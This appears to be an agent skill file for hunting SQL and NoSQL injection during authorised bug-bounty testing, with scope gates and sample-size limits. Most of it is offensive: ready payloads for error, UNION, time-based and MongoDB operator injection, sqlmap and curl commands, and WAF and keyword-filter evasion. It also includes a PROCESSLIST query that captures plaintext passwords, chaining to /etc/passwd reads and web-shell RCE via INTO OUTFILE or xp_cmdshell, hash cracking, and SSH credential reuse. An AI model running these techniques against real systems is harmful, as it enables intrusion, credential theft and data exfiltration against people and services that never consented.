---
name: hunt-sqli
description: SQLi and NoSQLi hunting - error-based, boolean-blind, time-based, UNION, NoSQL operator injection. sqlmap automation after manual confirmation. Wiki-first, FIND schema output.
---

# Hunt: SQL Injection

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "SQL injection SQLi NoSQL union boolean-blind time-based error-based" via wiki-search MCP
```

Hub: [[web-moc]] (live web index). Primary page: [[sql-injection]]. Payload arsenal: `wiki/payloads/sqli.md`.
Anchors: [[nosql-injection]], [[orm-injection]].

## Confirmation gate

**NOT confirmation:** a generic `500`; a WAF block page or a "SQL injection detected" string (that is the app's filter firing, not the database); a reflected error string you have not proved originates from the DB; a single non-repeatable slow response; a boolean or time inference with no differential (no clean baseline-vs-injected delta); the payload echoed back from your own request; any verdict read off a response body without a clean-session re-verify.

**IS confirmation:** a DB error whose text is demonstrably from the engine (`extractvalue`/`updatexml` output, a driver error naming the DBMS); UNION or error-based output that returns real DB content; a boolean oracle that flips TRUE/FALSE consistently across probes; a time delta that reproduces on repeat (baseline vs `SLEEP(5)`/`pg_sleep(5)`/`WAITFOR`, re-run); or an out-of-band DNS/HTTP hit to your unique Collaborator/interactsh subdomain. Re-verify in a CLEAN session every time; on a login-redirect oracle clear the session cookie between probes (a stale authenticated session reads as always-true).

**Out-of-band (blind SQLi via DNS/HTTP).** When you plant a blind/OOB payload, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | sqli | <date> | waiting | |` (columns: token | sink | class | planted | status | source, token = your unique Collaborator/interactsh label). Exfil sinks: MySQL `LOAD_FILE`/UNC path, MSSQL `xp_dirtree`, Oracle `UTL_HTTP`. The recon-capture hook auto-correlates the callback to flip the row to HIT and SessionStart surfaces HITs; a `HIT row` is the gate to scaffold the FIND. **Do NOT claim a blind** SQLi without a HIT row.

## Attack surface

Highest-value injection points first:

- **Authentication / login** - a bypass here is auth bypass; the login-redirect oracle (below) turns even a filtered, output-less login into a blind extractor.
- **Search / filter / sort / report params** - `?q=`, `?category=`, `?sort=&order=` (ORDER BY injection), `?start_date=`; user input lands straight in a WHERE/ORDER BY.
- **Anything that reflects query output or a DB error** - error-based and UNION need a reflection sink; if the page you are hitting reflects nothing, test on one that does.
- **JSON bodies with nested objects** - operator injection -> NoSQL (`{"$gt":""}`, `[$ne]`).
- **Second-order sinks** - a value stored safely at register/login but rendered unsafely elsewhere (profile, dashboard, "last logins").
- **Headers, cookies, path segments** - the least-tested vectors; ORDER BY / LIMIT clauses frequently take raw input.

URL patterns:
```
/search?q=  /filter?category=  /sort?by=&order=  /report?start_date=
/api/v1/items?id=  /index.php?id=  /gallery?album_id=  ?page=&limit=
```
Fingerprint the DB: PHP + Apache -> MySQL; Express + MongoDB -> NoSQL; `application/json` with nested objects -> potential NoSQL.

## Methodology

**Order: in-band before blind.** Try error-based and UNION (direct data/errors) BEFORE
boolean/time-based - blind is slow and easily masked (e.g. an anti-bruteforce `SLEEP()` on the
login page adds a constant delay that hides your injected `SLEEP`). UNION/error need a place
where query output or a DB error is REFLECTED; if the page you are hitting reflects nothing,
test the SQLi on a different page that does.

1. Enumerate all input vectors (GET, POST, JSON body, headers, cookies, path segments).
2. Baseline the response (length, status, time).
3. Error probes in **every quote context** - `'` `"` `` ` `` `')` `"))` and numeric/no-quote.
   A `'` doing nothing does NOT mean safe: the sink may be double-quoted (`WHERE x="$v"`). Watch
   for a reflected DB error or any length change.
4. In-band first: error-based (`extractvalue`/`updatexml`) and UNION (`ORDER BY` for col count,
   then `UNION SELECT`). Mind display truncation when sizing extracted chunks.
5. Only then blind: boolean (`AND 1=1` vs `AND 1=2`) then time (`SLEEP(5)`/`pg_sleep(5)`/`WAITFOR`).
6. **Second-order:** if login/register is parameterized, the SAME stored value may be unsafe on
   another page (profile/dashboard/"last logins") OR simply wherever the app echoes your stored
   name back - a greeting, a "Welcome X", a counter/result line. Register the payload as the
   username, log in, then load the page that renders it - and READ THE WHOLE reflected block, not a
   keyword grep: the phrasing can shift (singular "1 word" vs plural "N words") and hide the dumped
   data. This class is rare and under-tested, so it is easy to walk past - always try it before
   concluding a parameterized login is safe. See the PROCESSLIST section below.
7. NoSQL (MongoDB): replace value with `{"$gt": ""}` or `param[$ne]=invalid`.
8. **Tool-first for the dump, always.** Confirm manually in 1-2 requests only (e.g. an arithmetic
   tell: `id=2-1` evaluates to row 1 = injection proven) - the NEXT step is sqlmap, never a
   hand-rolled `group_concat`/`LIMIT` paging loop to extract the data yourself:
```bash
# ONE confirming curl (baseline vs injected); then hand off to sqlmap, don't hand-loop probes
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)-- -"

# sqlmap owns the rest: DBMS fingerprint, WAF bypass, enumeration, extraction
sqlmap -u "https://target.com/search?q=test" --level=3 --risk=2 --batch --dbs
```
Keep exactly ONE manual curl in the writeup as the confirming PoC; sqlmap owns enumeration.

**Rate-sensitive / fragile / worker-starving target -> sqlmap's detection burst trips HTTP 000.**
Run it gentle: `--delay 2 --timeout 40`. Since injection was already manually confirmed, let sqlmap
**resume from its own session** (same output dir/target) instead of restarting - it skips
re-detection and goes straight to a fast UNION dump rather than re-probing the whole boundary.
**Scope sqlmap to PROVING the vuln, not mass-exfiltrating records.** An automated table dump is
data extraction and falls under the hunt-core enumeration limits: confirm + fingerprint + a
bounded sample (`--dump` with `--start 1 --stop 5`), never `--dump-all`. Sample of 5, ceiling 20
with operator approval, 0 under `no_bruteforce`.
9. Escalate impact (scoped to proof, not mass extraction): UNION extraction, INFORMATION_SCHEMA
   for schema shape, file read/write if perms allow. See Chaining below.
10. Document: Burp Repeater screenshot + sqlmap output + a non-sensitive data sample. Push the
    confirming request into **Burp Repeater** (`Skill(hunt-burp)` / `capture.sh burp`) so the
    operator can replay it; use **Collaborator** for the OOB payloads above.

Distill when confirmed - reusable NoSQL/ORM bypass, GENERIC, no client host:
`python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/sql-injection.md`

## Key Payloads
```sql
-- Error probes
' '' ` ') ")) ' OR '1'='1 admin'--

-- Time-based (MySQL)
' AND SLEEP(5)--

-- Time-based (MSSQL)
'; WAITFOR DELAY '0:0:5'--

-- UNION (find column count first)
' ORDER BY 1-- ' ORDER BY 10--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--

-- NoSQL (MongoDB JSON body)
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}}

-- NoSQL (query string)
username[$ne]=invalid&password[$ne]=invalid
```

## Chaining

Once you have a working injection, escalate along these edges (keep extraction scoped to proof):

- **File read** - MySQL `LOAD_FILE('/etc/passwd')`, MSSQL `OPENROWSET`, Oracle `UTL_FILE`; the OOB
  DNS-exfil sinks above double as blind file read.
- **File write -> RCE** - MySQL `INTO OUTFILE`/`DUMPFILE` a web-shell into the docroot; MSSQL
  `xp_cmdshell`; Postgres `COPY ... TO PROGRAM`; stacked queries where the driver allows them.
  Hand off to `hunt-rce` once you have command execution.
- **Credential reuse** - hashes/plaintext pulled from the DB (see PROCESSLIST below) are frequently
  reused for SSH, not the web login. Crack, then pivot; hand off to `hunt-auth` for the ATO.
- **Dumped table -> targeted crack wordlist.** A dumped user/credential table (even a different
  app's plaintext passwords) is a high-value CUSTOM wordlist for cracking a related hash elsewhere
  (e.g. a CMS admin hash) - beats rockyou. See [[password-attacks]].

## Evasion

A WAF block or a "SQL injection detected" string is NOT "closed" - it is a filter to map and
bypass, not a fix. Vary the payload: inline comments (`/**/`, `-- -` vs `#`), case (`SeLeCt`),
encoding (URL/double-URL/hex, but note some filters block `0x`), whitespace alternatives, `AND`
logic instead of `OR`, `CASE WHEN` instead of `IF`. The keyword-filter / login-redirect-oracle
section below is the worked example.

## Second-order + PROCESSLIST credential capture

When the app hashes the password *inside* the SQL (`... AND pass=md5("PLAINTEXT")`) the plaintext
sits in the live query. If a bot/admin logs in periodically (often held a few seconds by an
anti-bruteforce `SLEEP()`), read it via the SQLi - the app connects as the same DB user, so you
see its threads even without global `PROCESS` priv:
```sql
" UNION SELECT 1,SUBSTRING((SELECT info FROM information_schema.PROCESSLIST
  WHERE id=(SELECT MIN(id) FROM information_schema.PROCESSLIST)),POS,16)-- -   -- POS=1,17,33,...
```
`INFO` is non-NULL only while running -> poll fast, timed to the bot. Output truncates to the
sink's display width -> register one second-order account per N-char window, log each in, hammer
the rendering page with all sessions during the bot's window, concatenate the blocks. Recovered
creds are often **reused for SSH**, not the web login. Full writeup: [[sql-injection]].

## Cracking recovered hashes (try easy first)
1. Unsalted MD5/SHA1 -> **online lookup first** (CrackStation 190GB table, hashes.com) - instant
   for leaked/common passwords that rockyou+rules miss. (Note: needs a browser/captcha; if the
   tooling host has no internet, do it from a box that does.)
2. Then local: `hashcat -m 0 h /usr/share/wordlists/rockyou.txt -r best64`, then `john`.
3. A hash that resists all of the above on a "hard" box may be a **decoy/rabbit-hole** - pivot
   (e.g. PROCESSLIST capture above) instead of grinding. A `0e...` MD5 is only a magic hash for
   PHP `==` if EVERY char after `0e` is a digit.

## App keyword-filter + login redirect oracle (sqlmap blind-spot)
App rolls its own `preg_match` blacklist (returns a fixed "SQL Injection detected" string). Map it
one token at a time, then bypass: `AND` logic not `OR`, `-- -` not `/**/`, quoted literals not `0x`
hex, `CASE WHEN` not `IFNULL`. If the post-login page is static, the **login redirect is the
oracle**: `user' AND 1=1-- -` -> 302 (TRUE), `AND 1=2` -> 200 (FALSE). sqlmap usually FAILS here
(hex-encodes data as `0x` -> blocked; follows the 302 -> diff confusion), so hand-roll a boolean
extractor and **clear the session cookie every probe** (a login oracle otherwise stays
authenticated -> always-true). Don't name the script `enum.py` (shadows stdlib). See [[sql-injection]].

## Severity

Confirmed = data extracted, a DB-sourced error/UNION reflection, a consistent boolean oracle, a
reproducible time delta on repeat, or an OOB HIT.

| Demonstrated | Typical |
|---|---|
| Full DB dump, or RCE via `xp_cmdshell` / `INTO OUTFILE` web-shell | critical |
| Arbitrary data extraction (auth bypass, cross-table read, credentials) | high |
| Blind boolean/time-based only, no data pulled | medium |

Rate on demonstrated impact per hunt-core, not the theoretical maximum.

## Deadends

```
Append: - [ ] SQLi on <host> param <x> -- all probes 200/same-length, no time delta or DB error;
              tried quote contexts / UNION / boolean / time / OOB, WAF filter mapped and bypassed
```

Record what you tried, not just that it failed. The next pass needs to know the boundary.
